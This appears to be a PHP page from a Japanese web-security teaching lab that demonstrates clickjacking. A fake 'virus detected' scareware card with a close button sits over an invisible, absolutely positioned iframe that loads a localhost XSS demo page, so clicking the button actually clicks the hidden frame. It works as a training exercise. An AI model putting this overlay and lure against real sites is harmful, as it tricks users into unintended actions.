<?php
$title = "クリックジャギング(体験画面)";
require dirname(__DIR__) . "/includes/header.php";
?>
<div class="mt-5" style="position: relative;">
  <div class="card">
    <h5 class="card-header bg-danger text-white">ウイルスに感染しました</h5>
    <div class="card-body p-4 d-flex justify-content-end">
      <button class="btn btn-secondary p-3 mt-5 me-5">X</button>
    </div>
    <div class="text-center mb-4">
      <h3 class="text-danger fw-bold">PCの動作が著しく低下しています!</h3>
      <p class="mb-2">お使いのデバイスから <strong>3個の有害なファイル</strong> が見つかりました。</p>
      <p class="mb-2">※×ボタンをクリック後 <strong>XSSの体験ページへ行ってみてください。</strong> </p>
      <div class="progress mb-2" style="height: 25px;">
        <div class="progress-bar progress-bar-striped progress-bar-animated bg-danger" style="width: 85%">スキャン中... 85%</div>
      </div>
    </div>
  </div>


  <iframe
    src="http://localhost:8080/xss/xss.php?message=🚨クリックジャッキング成功（完全ステルス）"
    class="target-iframe"
    style="
    position: absolute;
     top: -120px; left: 40px; 
     width: 100%; 
     height: 100%; 
     z-index: 5; 
     opacity: 0; 
     border: none;">
  </iframe>

</div>

<?php require dirname(__DIR__) . "/includes/footer.php"; ?>